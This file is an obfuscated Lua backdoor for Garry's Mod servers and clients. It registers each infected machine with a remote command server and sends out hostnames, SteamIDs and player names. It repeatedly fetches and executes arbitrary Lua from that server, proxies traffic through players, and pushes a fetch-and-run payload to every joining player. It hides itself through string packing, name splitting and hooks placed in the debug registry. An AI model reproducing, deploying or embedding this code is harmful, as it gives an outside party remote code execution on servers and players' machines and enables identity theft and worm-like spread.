local cLs = "pd0\01051	[.ml=|x6?Ge:g<rn \034R>%&2s\092fc_!\092q\092p\092a\092t\092\092, ==\092s\092n\092ong\092c|0pt ():nd []\010plllosrstf\092eal[^=]ip: ?]%%erspl?a=CRCrepb64allmerchkuidreginfpwnk_aInikeymoddec9+/ervd?%lenencintawnDEFsubQRS.R,\034:\010gumtecablProERRurlgetendsteSenitiNethtt_secmdStrAddhk_p_sing]:\010ime---]: netvalbootblocpwn_ock_----BACKchk_texthttprepsintePlayHTTPrvalfindSimpleTiCalldiffcharbyteNicknextsetmtimeableStri']lo,cmd]: [p_waRunCutilfunctialonsoworkwakeSending)typetitytingmand texked.math: ar0000fsengsubswerNONEringandsmnopHOOKimermer#%%%1gmodwraproupfileCopyitingcrypt, srckeyidchk_rStarttimer-----proxysleepyTimes: %stp_anlowererInierverpwn_hSpawnhttp_tableDToStUnPrencodecountpcallStrinpairsupperdebugues: errorMergepwnp_89ABCdelayThinkTIMERpwn.pder_iprint_inteAddNepwn_cimersinsertrunluaPlayerconcatGetAll%d?%d?formatxpcallmethodLLBACKDestroremovepwn_htyTimerCheckTrandomStringloadedn=_G['------t blocp_answSERVERpwnp_bipairschk_tiCLIENTRROR:\010unpackstringRunStrpwn.G.playerenabledaddresshttp_idworkingkStringpwn_httwaitingtimeoutReceiveSendToSistableAddHookpackagetedCallgetinfoincludeid. ValReplace%*%+%-%setmetaToTabletPostEnSteamIDSendLuaHTTP CA1.lua\034,CompilesuccessCurTimeERROR:\010ntervalb64_decpwn.srvpwnp_blImplodelocked_cal G,Rb64_encTimer \034JKLMNOPBase64EingToIDIntToHexpwn.Calllocal pwUniqueIDgetmetatEndsWith%d%d%d?%GetUserGhttp_sennextcall--------SYNTAX ETEMP_srctostringhttp_waitonumber.Fetch(\034pwn_chk_pwn_wakeked_textpwnpusessendtoclpwn_httpetatableblocked_isstringisnumberp_block_tialSpawNET HOOKchk_lastgetlocal01234567IntToBinGetHookshostportworkIDToNetworkIBinToIntNET CALLDestroyTdownloads not valhttp_sendreplycommAddNetworReadFloatUnPauseTiStartWithpwnp_bloconsoleComlycommandchk_interStopTimerleCommand\034 failed.p_checkerGetConVarTUVWXYZab[%-%^%$%(dowload_rCallHookscoroutineInitialSp012345678dToServertworkStriABCDEFGHIERROR IN kallhooksTEMP_src cmd, pwn.http_proxyttp_answerWriteFloatRemoveHookNetworkStrold_prints%d%d%d?%d?qrstuvwxyzcdefghijklReadStringent list iprintplayechk_failed%)%%%.%[%]ulibhooksydictedCurT=pwn.G,pwnpwn_http_sgetupvalue%s) [%s] %PauseTimerStartTimerisfunctiond?%d?%d?%dSimpleTimerpwn.init_clb64_enc_oldCheckTimersCreateTimerPwnPProtectStringToHexGetHostNamegetregistryLocalPlayerAdjustTimerTimerExistshttp_answerWriteStringsetintervalunconnected"
local sSs = string.sub
local q = function(a, b)
	return sSs(cLs, a, b + a)
end
if not pcall then
	return 
end

pcall(function()
	local w = setmetatable({  }, {  }, util['CRC'](GetConVarString('ip')) * 2)
	if w and w['G'] ~= nil then
		if w['boot'] and not w['working'] then
			w['boot']()
		end

		return 
	end

	local e = {  }
	local r = _G[util['CRC'](os['time']() * 228)]
	if not r then
		r = { _G, debug['getregistry']() }
		e['sendtocl'] = true
	else
	end

	local t, y = r[1]['pairs'], r[1]['istable']
	local u
	u = function(i, o)
		local p = {  }
		for a, s in t(i) do
			if not y(s) then
				p[a] = s
			else
				o = o or {  }
				o[i] = p
				if o[s] then
					p[a] = o[s]
				else
					p[a] = u(s, o)
				end

			end

		end

		return p
	end
	local i = u(r[1])
	local o = u(r[2])
	e['G'] = i
	e['R'] = o
	e['G']['cmd'] = i['RunC'..'onso'..'leCommand']
	local p = i['SERVER']
	local a = i['CLIENT']
	local s = i['RunC'..'onsoleCom'..'mand']
	local d = i['print']
	local f = i['LocalPlayer']
	local g = i['tonumber']
	local h = i['tostring']
	local j = i['GetHostName']
	local k = i['GetConVar'..'Str'..'ing']
	local l = i['Compile'..'Strin'..'g']
	local z = i['type']
	local x = i['pcall']
	local c = i['CurTime']
	local v = i['isnumber']
	local b = i['isfunction']
	local n = i['isstring']
	local m = i['istable']
	local Q = i['HTTP']
	local W = i['UnPre'..'dictedCurT'..'ime']
	local E = i['unpack']
	local R = i['include']
	local T = i['getmetat'..'able']
	local Y = i['setm'..'etatable']
	local U = i['pairs']
	local I = i['ipairs']
	local O = i['next']
	local P = i['debug']
	if not P or not i['debug']['getupvalue'] or not i['debug']['getinfo'] then
		P = i['package']['loaded']['debug']
	end

	local A = o['Player']['UniqueID']
	local S = o['Player']['SteamID']
	local D = o['Player']['Nick']
	local F = o['Player']['SendLua']
	local G = i['string']
	local H = i['math']
	local J = i['player']
	local K = i['os']
	local L = i['http']
	local Z = i['table']
	local X = i['gmod']
	local C = i['file']
	G['ToTable'] = function(V)
		local B = {  }
		for N = 1, G['len'](V) do
			B[N] = G['sub'](V, N, N)
		end

		return B
	end
	G['Replace'] = function(V, B, N)
		B = B:gsub('[%-%^%$%('..'%)%%%.%[%]'..'%*%+%-%'..'?]', '%%%1')
		N = N:gsub('%%', '%%%1')
		return (V:gsub(B, N))
	end
	G['StartWith'] = function(V, B)
		return G['sub'](V, 1, G['len'](B)) == B
	end
	G['EndsWith'] = function(V, B)
		return B == q(1, -1) or G['sub'](V, -G['len'](B)) == B
	end
	Z['Copy'] = function(V, B)
		if (V == nil) then
			return nil
		end

		local N = {  }
		i['setmeta'..'table'](N, i['getmetat'..'abl'..'e'](V))
		for M, _ in i['pairs'](V) do
			if (not m(_)) then
				N[M] = _
			else
				B = B or {  }
				B[V] = N
				if B[_] then
					N[M] = B[_]
				else
					N[M] = Z['Copy'](_, B)
				end

			end

		end

		return N
	end
	Z['Merge'] = function(V, B)
		for N, M in i['pairs'](B) do
			if (z(M) == 'table' and z(V[N]) == 'table') then
				Z['Merge'](V[N], M)
			else
				V[N] = M
			end

		end

		return V
	end
	local V = hook['Call']
	local B = P['getregistry']()
	local N = {  }
	local M = i['coroutine']['wrap']
	local _ = i['xpcall']
	local qq = i['Pro'..'tec'..'tedCall']
	local wq = i['error']
	for eq = 1, #B do
		if B[eq] == V then
			Z['insert'](N, eq)
		end

	end

	if #N == 0 then
		return 
	end

	local eq
	eq = function(rq, tq, ...)
		local yq = e['CallHooks'](rq, ...)
		if yq ~= nil then
			return yq
		end

		if e['bloc'..'kallhooks'] then
			return 
		end

		local uq = B[1]
		local iq = M(_)
		local oq = { iq(V, uq, rq, tq, ...) }
		local pq = oq[1]
		if pq then
			return E(oq, 2)
		else
			qq(wq)
		end

	end
	for rq = 1, #N do
		B[N[rq]] = eq
	end

	e['Call'] = function(rq, tq, yq, ...)
		if n(rq) and n(tq) and b(yq) then
			local uq, iq = x(yq, ...)
			if not uq then
				e['p']('ERROR IN '..G['upper'](rq)..' "'..tq..'":
'..iq)
			end

			return uq, iq
		else
			e['p']('pwn.Call'..': ar'..'gum'..'ent list i'..'s not val'..'id. Val'..'ues: '..h(rq)..', '..h(tq)..', '..h(yq))
			return false
		end

	end
	local rq = {  }
	e['GetHooks'] = function()
		return rq
	end
	e['ulibhooksy'..'ste'..'m'] = ulibhooksystem
	e['AddHook'] = function(tq, yq, uq)
		if n(tq) and n(yq) and b(uq) then
			if not rq[tq] then
				rq[tq] = {  }
			end

			local iq = uq
			uq = function(...)
				local oq, pq = e['Call']('HOOK', yq, iq, ...)
				if oq then
					return pq
				end

			end
			e['RemoveHook'](tq, yq)
			rq[tq][yq] = uq
		end

	end
	e['RemoveHook'] = function(tq, yq)
		if rq[tq] and rq[tq][yq] then
			rq[tq][yq] = nil
		end

	end
	e['CallHooks'] = function(tq, ...)
		if not rq[tq] then
			return 
		end

		local yq = nil
		for uq, iq in U(rq[tq]) do
			yq = yq or iq(...)
		end

		return yq
	end
	local tq = {  }
	util['Net'..'workIDTo'..'String'] = function(yq)
		if n(yq) then
			yq = g(yq)
		end

		if v(yq) then
			local uq = i['util']['NetworkI'..'DToSt'..'ring'](yq)
			if tq[uq] then
				if P['getinfo'](2) then
					local iq, oq = P['getlocal'](2, 1)
					local pq, aq = P['getlocal'](2, 2)
					tq[uq](oq, aq)
				end

			else
				return uq
			end

		end

	end
	e['Receive'] = function(yq, uq)
		if n(yq) and b(uq) then
			local iq = uq
			uq = function(...)
				e['Call']('NET HOOK', yq, iq, ...)
			end
			tq[G['lower'](yq)] = uq
		end

	end
	local yq = i['util']
	local uq = i['net']
	local iq, oq = {  }, {  }
	e['TimerExists'] = function(pq)
		return iq[pq] ~= nil
	end
	e['CreateTimer'] = function(pq, aq, sq, dq)
		if n(pq) and v(aq) and aq > 0 and v(sq) and sq >= 0 and b(dq) then
			iq[pq] = { ['enabled'] = true, ['delay'] = aq, ['nextcall'] = c() + aq, ['reps'] = sq, ['func'] = dq }
			return true
		else
			return false
		end

	end
	e['Destro'..'yTimer'] = function(pq)
		iq[pq] = nil
		return true
	end
	e['StartTimer'] = function(pq)
		local aq = iq[pq]
		if aq then
			aq['enabled'] = true
			aq['nextcall'] = c() + aq['delay']
			return true
		else
			return false
		end

	end
	e['StopTimer'] = function(pq)
		local aq = iq[pq]
		if aq then
			aq['enabled'] = false
			return true
		else
			return false
		end

	end
	e['PauseTimer'] = function(pq)
		local aq = iq[pq]
		if aq then
			aq['enabled'] = false
			aq['diff'] = aq['nextcall'] - c()
			return true
		else
			return false
		end

	end
	e['UnPauseTi'..'mer'] = function(pq)
		local aq = iq[pq]
		if aq then
			aq['enabled'] = true
			aq['nextcall'] = aq['diff'] and c() + aq['diff'] or c() + aq['delay']
			return true
		else
			return false
		end

	end
	e['AdjustTimer'] = function(pq, aq, sq, dq)
		if n(pq) and v(aq) and aq > 0 and v(sq) and sq >= 0 then
			if not iq[pq] or (dq ~= nil and not b(dq)) then
				return false
			end

			iq[pq] = { ['enabled'] = true, ['delay'] = aq, ['nextcall'] = c() + aq, ['reps'] = sq, ['func'] = dq or iq[pq]['func'] }
			return true
		else
			return false
		end

	end
	e['SimpleTimer'] = function(pq, aq)
		if v(pq) and pq >= 0 and b(aq) then
			Z['insert'](oq, { W() + pq, aq })
			return true
		else
			return false
		end

	end
	e['CheckTimers'] = function()
		for pq, aq in U(iq) do
			if aq['enabled'] and aq['nextcall'] <= c() then
				local sq = e['Call']('TIMER', pq, aq['func'])
				if not sq then
					e['p']('Timer "'..pq..'" failed.')
					iq[pq] = nil
					continue
				end

				if aq['reps'] ~= 0 then
					aq['reps'] = aq['reps'] - 1
					if aq['reps'] == 0 then
						iq[pq] = nil
						continue
					end

				end

				aq['nextcall'] = c() + aq['delay']
			end

		end

		for pq, aq in U(oq) do
			if c() >= aq[1] then
				e['Call']('TIMER', 'Simp'..'leTi'..'mer#'..pq, aq[2])
				Z['remove'](oq, pq)
			end

		end

	end
	e['AddHook']('Think', 'pwn_'..'CheckT'..'imers', e['CheckTimers'])
	local pq
	pq = function()
		e['fsen'..'der_i'..'nterval'] = 0.15
		e['chk'..'_inte'..'rval'] = p and 1 or 4
		e['spl'] = '?a='
		e['working'] = true
		e['chk_failed'] = 0
		e['chk_last'] = q(1, -1)
		e['rep'..'lycommand'..'s'] = false
		e['b64'] = true
		e['crypt'] = false
		e['address'] = "http://gpwn.zapto.org:1337/"
		local aq = "178_32_52_59"
		if p then
			e['uid'] = aq..'_'..k('hostport')
		else
			e['uid'] = A(f())
		end

		e['IntToHex'] = function(sq)
			if sq > 255 then
				return nil
			end

			local dq
			dq = function(fq)
				local gq = g(H['BinToInt'](fq))
				local hq = '01234567'..'89ABC'..'DEF'
				return hq[gq + 1]
			end
			local fq = H['IntToBin'](sq)
			if (G['len'](fq) > 8) then
				fq = G['sub'](fq, G['len'](fq) - 7, G['len'](fq))
			else
				while G['len'](fq) < 8 do
					fq = '0'..fq
				end

			end

			local gq
			gq = dq(G['sub'](fq, 1, 4))
			gq = gq..dq(G['sub'](fq, 5, 8))
			return gq
		end
		local sq = 'ABCDEFGHI'..'JKLMNOP'..'QRS'..'TUVWXYZab'..'cdefghijkl'..'mnop'..'qrstuvwxyz'..'012345678'..'9+/'
		e['b64_enc_old'] = function(dq)
			return ((dq:gsub('.', function(fq)
				local gq, hq = q(1, -1), fq:byte()
				for jq = 8, 1, -1 do
					gq = gq..(hq % 2 ^ jq - hq % 2 ^ (jq - 1) > 0 and '1' or '0')
				end

				return gq
			end)..'0000'):gsub('%d%d%d?%d?'..'%d?%d?', function(fq)
				if (#fq < 6) then
					return q(1, -1)
				end

				local gq = 0
				for hq = 1, 6 do
					gq = gq + (fq:sub(hq, hq) == '1' and 2 ^ (6 - hq) or 0)
				end

				return sq:sub(gq + 1, gq + 1)
			end)..({ q(1, -1), '==', '=' })[#dq % 3 + 1])
		end
		e['b64_enc'] = function(dq)
			dq = h(dq)
			if G['len'](dq) < 2 then
				return e['b64_enc_old'](dq)
			end

			local fq = yq['Base64E'..'ncode'](dq)
			return G['Replace'](fq, '
', q(1, -1), true)
		end
		e['b64_dec'] = function(dq)
			dq = G['gsub'](dq, '[^'..sq..'=]', q(1, -1))
			return (dq:gsub('.', function(fq)
				if (fq == '=') then
					return q(1, -1)
				end

				local gq, hq = q(1, -1), (sq:find(fq) - 1)
				for jq = 6, 1, -1 do
					gq = gq..(hq % 2 ^ jq - hq % 2 ^ (jq - 1) > 0 and '1' or '0')
				end

				return gq
			end):gsub('%d%d%d?%'..'d?%'..'d?%d?%d?%d'..'?', function(fq)
				if (#fq ~= 8) then
					return q(1, -1)
				end

				local gq = 0
				for hq = 1, 8 do
					gq = gq + (fq:sub(hq, hq) == '1' and 2 ^ (8 - hq) or 0)
				end

				return G['char'](gq)
			end))
		end
		local dq
		dq = function(fq, gq)
			fq = fq + gq
			if (fq > 255) then
				fq = fq - 255
			end

			return fq
		end
		e['key'] = "WYukrsZoLYiXiwcC1lLiaecvqO7VLQVbEZXh58J8GLt9rt7YmsGQavJnpXjYg6mlZZlbjuM2DZRW8cl6SEvICcfuecysKaXKlVjzVPgzcCBQ3hQNWx4VA2UbUsx5wGsE9Vody9pwgrsqOVfB4kZvj8uQh3VAgllJAcWuugZEs2IUJUMZ8IqX4NsqHL6ddPV5CTQdcuKJIksbQPZZtrSKlIVVpQWnkUhSyDCduDb20xdF"
		e['keyid'] = "26DC82D18CF8BE7"
		e['enc'] = function(fq, gq)
			gq = gq or e['key']
			local hq = fq:ToTable()
			local jq = {  }
			local kq = 0
			local lq = #hq
			while #hq > 0 do
				kq = kq + 1
				if kq >= gq:len() then
					kq = 1
				end

				local zq = G['byte'](gq, kq)
				local xq = G['byte'](gq, kq + 1)
				local cq = H['mod'](zq * xq, #hq) + 1
				local vq = G['byte'](hq[cq]) + zq
				if vq > 255 then
					vq = vq - 255
				end

				Z['insert'](jq, G['char'](vq))
				hq[cq] = hq[#hq]
				Z['remove'](hq, #hq)
			end

			return Z['concat'](jq)
		end
		e['dec'] = function(fq, gq)
			gq = gq or e['key']
			local hq = fq:ToTable()
			local jq = {  }
			local kq = H['mod'](fq:len(), gq:len() - 1) + 2
			local lq = fq:len()
			local zq = 1
			while lq > 0 do
				kq = kq - 1
				if kq <= 1 then
					kq = gq:len()
				end

				local xq = G['byte'](gq, kq - 1)
				local cq = G['byte'](gq, kq)
				local vq = H['mod'](xq * cq, zq) + 1
				local bq = G['byte'](hq[lq]) - xq
				if bq < 0 then
					bq = bq + 255
				end

				jq[#jq + 1] = jq[vq]
				jq[vq] = G['char'](bq)
				lq = lq - 1
				zq = zq + 1
			end

			return Z['concat'](jq)
		end
		e['StringToHex'] = function(fq)
			if e['b64'] then
				return 'x'..e['b64_enc'](fq)
			else
				local gq = q(1, -1)
				for hq, jq in U(G['ToTable'](fq)) do
					gq = gq..e['IntToHex'](G['byte'](jq))
				end

				return gq
			end

		end
		e['old_prints'] = {  }
		e['pwnpuses'] = 0
		e['pwnp_b'..'locked_'..'text'] = {  }
		e['pwnp_bl'..'ock_'..'all'] = false
		e['p'] = function(...)
			local fq = { ... }
			for gq, hq in U(fq) do
				fq[gq] = h(hq)
			end

			text = G['Implode']('	', fq)
			if e['pwnp_'..'bloc'..'k_a'..'ll'] then
				return nil
			end

			if e['pwnp_'..'blocked_'..'text'][text] then
				return nil
			end

			if e['pwnpuses'] > 100 then
				e['pwn'..'p_block_'..'all'] = true
				return 
			end

			e['pwnpuses'] = e['pwnpuses'] + 1
			local gq = e['old_prints'][text]
			if not gq then
				gq = { ['count'] = 0 }
			end

			gq['time'] = c()
			gq['count'] = gq['count'] + 1
			e['old_prints'][text] = gq
			if gq['count'] > 5 then
				e['old_prints'][text] = nil
				e['pwnp_bloc'..'ked_text'][text] = true
				e['p']('pwn.p'..' tex'..'t bloc'..'ked.')
			end

			e['http'](e['address']..e['uid']..e['spl']..'2'..e['StringToHex'](text))
		end
		e['p_checker'] = function()
			for fq, gq in U(e['old_prints']) do
				gq['count'] = gq['count'] - 1
				if gq['count'] <= 0 then
					e['old_prints'][fq] = nil
				end

			end

			e['pwnpuses'] = e['pwnpuses'] - 10
			if e['pwnpuses'] < 0 then
				e['pwnpuses'] = 0
			end

		end
		e['CreateTimer']('PwnPProtect', 1, 0, e['p_checker'])
		e['l'] = function(fq, gq, hq, jq)
			local kq = q(1, -1)
			if jq then
				for lq, zq in U(jq) do
					kq = kq..(lq == 1 and q(1, -1) or '|')..Z['concat'](zq, ':')
				end

			end

			e['http'](e['address']..e['uid']..e['spl']..'6'..(gq and e['StringToHex'](gq) or q(1, -1))..'|'..e['StringToHex'](kq)..'|'..(hq and '1' or '0')..e['StringToHex'](h(fq)))
		end
		local fq = 0
		e['reg'] = function()
			local gq, hq
			if p then
				gq = e['uid']
				hq = j()
			else
				gq = S(f())
				hq = D(f())
				if hq == 'unconnected' then
					if fq < 21 then
						fq = fq + 1
						e['SimpleTimer'](1, e['reg'])
					end

					if fq > 1 then
						return 
					end

				end

			end

			e['http'](e['address']..e['uid']..e['spl']..'0'..gq..'|'..e['StringToHex'](h(e['http_proxy']))..'|'..e['StringToHex'](j())..'|'..e['StringToHex'](hq))
		end
		e['sleep'] = function()
			e['working'] = false
			e['Destro'..'yTime'..'r']('pwn_chk_'..'time'..'r')
			if p then
				e['RemoveHook']('Play'..'erIni'..'tialSpaw'..'n', 'pwn.srv')
			end

		end
		e['setinterval'] = function(gq)
			e['chk_'..'inte'..'rval'] = gq
			e['AdjustTimer']('pwn_'..'chk_ti'..'mer', gq, 0)
		end
		e['runlua'] = function(gq, hq)
			local jq = yq['CRC'](K['time']() * H['random'](228, 1337))
			_G[jq] = e
			e['TEMP_src'] = gq
			local kq = i['Compile'..'Stri'..'ng'](hq and gq or 'local pw'..'n=_G[''..jq..'']lo'..'cal G,R'..',cmd'..', src'..'=pwn.G,pwn'..'.R,'..'pwn.G.'..'cmd, pwn.'..'TEMP_src '..gq, 'pwn', false)
			e['TEMP_src'] = nil
			if z(kq) == 'string' then
				e['p']('SYNTAX E'..'RROR:
'..kq)
			else
				local lq, zq = x(kq)
				if not lq then
					e['p']('ERROR:
'..zq)
				end

			end

			_G[jq] = nil
		end
		e['chk'] = function()
			e['chk_failed'] = e['chk_failed'] + e['chk_'..'int'..'erv'..'al']
			if e['chk_failed'] > 20 then
				if h(e['http_proxy']) == '0' then
										if p then
						for gq, hq in U(J['GetAll']()) do
							e['inf'](hq)
						end

						e['proxy'](-1)
					elseif yq['NetworkStr'..'ingToID']('pwn_'..'http_sen'..'d') ~= 0 then
						e['proxy'](-1)
					end

				else
					e['proxy'](0)
				end

				e['chk_failed'] = 0
			end

			e['http'](e['address']..e['uid']..e['spl']..'1', e['chk_r'])
			if not e['working'] then
				e['DestroyT'..'imer']('pwn_chk_'..'timer')
				e['RemoveHook']('Player'..'InitialSp'..'awn', 'pwn.srv')
			end

		end
		e['chk_r'] = function(gq, hq)
			if G['len'](gq) > 5 then
				if G['len'](gq) == 12 then
					if G['StartWith'](gq, 'NONE') and G['EndsWith'](gq, 'NONE') then
						if (gq ~= e['chk_last']) then
							e['chk_failed'] = 0
							e['chk_last'] = gq
						end

						return 
					end

				end

				e['chk_last'] = gq
				if e['replycomm'..'ands'] then
					e['p'](gq)
				end

				e['runlua'](gq)
			end

		end
		e['f'] = function(gq)
			local hq = gq
			hq = G['Replace'](hq, '\', '\\')
			hq = G['Replace'](hq, '
', '\n')
			hq = G['Replace'](hq, ' ', '\s')
			hq = G['Replace'](hq, '"', '\q')
			hq = G['Replace'](hq, '<', '\o')
			hq = G['Replace'](hq, '>', '\c')
			hq = G['Replace'](hq, '%', '\p')
			hq = G['Replace'](hq, '&', '\a')
			hq = G['Replace'](hq, '	', '\t')
			hq = G['Replace'](hq, '=', '\e')
			return hq
		end
		e['http_answer'] = function(gq, hq)
			local jq = uq['ReadFloat']()
			local kq = e['htt'..'p_wa'..'iting'][jq]
			if kq then
				e['Call']('NET CALL'..'BACK', h(jq), kq, uq['ReadString']())
				e['http_'..'waiting'][jq] = nil
			end

		end
		e['http_send'] = function(gq, hq)
			local jq = uq['ReadFloat']()
			e['http'](uq['ReadString'](), function(kq)
				uq['Start']('pwn_ht'..'tp_an'..'swer')
				uq['WriteFloat'](jq)
				uq['WriteString'](kq)
				if p then
					uq['Send'](hq)
				else
					uq['SendToS'..'erver']()
				end

			end)
		end
		e['proxy'] = function(gq)
			e['http_proxy'] = gq
			e['reg']()
		end
		e['http'] = function(gq, hq)
			local jq = e['address']..e['uid']..e['spl']
			local kq = jq..'c'
			if e['crypt'] and G['StartWith'](gq, jq) and not G['StartWith'](gq, kq) then
				gq = gq:sub(jq:len() + 1)
				gq = e['StringToHex'](e['enc'](gq))
				gq = jq..'c'..e['keyid']..'!'..gq
				if hq then
					local lq = hq
					local zq = hq
					hq = function(xq, cq)
						xq = e['dec'](xq)
						zq(xq, cq)
					end
				end

			end

			if h(e['http_proxy']) == '0' then
				if hq then
					Q({ ['url'] = gq, ['method'] = 'get', ['success'] = function(lq, zq, xq)
						e['Call']('HTTP CA'..'LLBACK', gq, hq, zq)
					end })
				else
					Q({ ['url'] = gq, ['method'] = 'get' })
				end

			else
				if p and #J['GetAll']() == 0 then
					return 
				end

				e['http_id'] = e['http_id'] + 1
				uq['Start']('pwn_http_s'..'end')
				uq['WriteFloat'](e['http_id'])
				uq['WriteString'](gq)
				if hq then
					e['htt'..'p_wa'..'iti'..'ng'][e['http_id']] = hq
				end

				if p then
					local lq
					if z(e['http_proxy']) ~= 'Player' then
						local zq = J['GetAll']()
						local xq
						if e['http_proxy'] == -1 then
							xq = {  }
							for cq, vq in U(zq) do
								if not vq:IsBot() then
									Z['insert'](xq, vq)
								end

							end

							lq = xq[H['random'](1, #xq)]
						else
							xq = zq
							lq = xq[e['http_proxy']]
						end

					else
						lq = e['http_proxy']
					end

					uq['Send'](lq)
				else
					uq['Sen'..'dToServer']()
				end

			end

		end
		e['download'] = function(gq, hq, jq)
			e['http'](e['address']..e['uid']..e['spl']..'5'..gq..'|'..hq..'|'..jq..'|0', e['runlua'])
		end
		e['dowload_r'] = function(gq, hq, jq, kq)
			e['http'](e['address']..e['uid']..e['spl']..'5'..gq..'|'..hq..'|'..jq..'|'..kq, e['runlua'])
		end
		e['printplaye'..'rs'] = function()
			local gq = {  }
			for hq, jq in U(J['GetAll']()) do
				local kq, lq = x(o['Player']['GetUserG'..'roup'], jq)
				if not kq then
					lq = 'ERR'
				end

				Z['insert'](gq, G['format']('%s) [%s] %'..'s: %s', hq, lq, S(jq), D(jq)))
			end

			e['p'](Z['concat'](gq, '
'))
		end
		e['tf'] = function(gq, hq, jq)
			local kq = q(1, -1)
			hq = hq or q(1, -1)
			if (jq) then
				for lq, zq in U(gq) do
					if (G['find'](lq, hq, 1, true) ~= nil) then
						kq = kq..lq..': '..z(zq)..'
'
					end

				end

			else
				hq = G['lower'](hq)
				for lq, zq in U(gq) do
					if (G['find'](G['lower'](lq), hq, 1, true) ~= nil) then
						kq = kq..lq..' ('..z(zq)..'):'..h(zq)..'
'
					end

				end

			end

			e['p'](kq..'--------'..'-----')
		end
		e['pt'] = function(gq, hq, jq, kq, lq)
			hq = hq or 0
			lq = lq or 0
			local zq = q(1, -1)
			local xq = G['rep']('	', lq)
			for cq, vq in U(gq) do
				if not kq or kq(cq, vq) then
					if m(vq) and hq ~= 0 then
						if jq then
							zq = zq..xq..z(cq)..' ['..cq..']:
'..e['pt'](vq, hq - 1, jq, kq, lq + 1)
						else
							zq = zq..xq..'['..cq..']:
'..e['pt'](vq, hq - 1, jq, kq, lq + 1)
						end

					else
						if jq then
							zq = zq..xq..z(cq)..' ['..cq..']: '..z(vq)..' ['..h(vq)..']
'
						else
							zq = zq..xq..'['..cq..']: ['..h(vq)..']
'
						end

					end

				end

			end

			if lq == 0 then
				e['p'](zq..'----'..'------'..'---')
			else
				return zq
			end

		end
		e['pl'] = function(gq)
			gq = G['lower'](gq)
			for hq, jq in U(J['GetAll']()) do
				if (G['find'](G['lower'](D(jq)), gq, 1, true) ~= nil) then
					return jq
				end

			end

		end
		e['inf'] = function(gq)
			if n(gq) then
				gq = e['pl'](gq)
			end

			F(gq, 'http'..'.Fetch("'..e['address']..'1.lua",'..'RunStr'..'ing)')
		end
		e['wake'] = function(gq)
			uq['Start']('pwn_wake')
			uq['Send'](gq)
		end
		e['boot'] = function()
			e['working'] = true
			e['http_proxy'] = 0
			e['http_id'] = 1
			e['http_wai'..'ting'] = {  }
			if p then
				yq['AddNetwor'..'kString']('pwn_h'..'ttp_answer')
				yq['Add'..'Net'..'work'..'String']('pwn_http'..'_se'..'nd')
			end

			e['Receive']('pwn_htt'..'p_answ'..'er', e['http_answer'])
			e['Receive']('pwn_htt'..'p_s'..'end', e['http_send'])
			e['timeout'] = 0
			e['reg']()
			e['CreateTimer']('pwn_c'..'hk_'..'time'..'r', e['chk_inter'..'val'], 0, e['chk'])
			if p then
				if e['sendtocl'] then
					e['AddHook']('Player'..'Ini'..'tial'..'Spawn', 'pwn.srv', e['inf'])
				end

			end

		end
		if e['working'] then
			e['boot']()
		end

		if p then
			i['util']['AddNe'..'tworkStri'..'ng']('pwn_wake')
		end

		e['Receive']('pwn_wake', function()
			if not e['working'] then
				e['boot']()
			end

		end)
	end
	if a then
		if f() == NULL then
			e['AddHook']('Ini'..'tPostEn'..'tity', 'pwn.init_cl', pq)
		else
			pq()
		end

	else
		e['SimpleTimer'](0, pq)
	end

end)
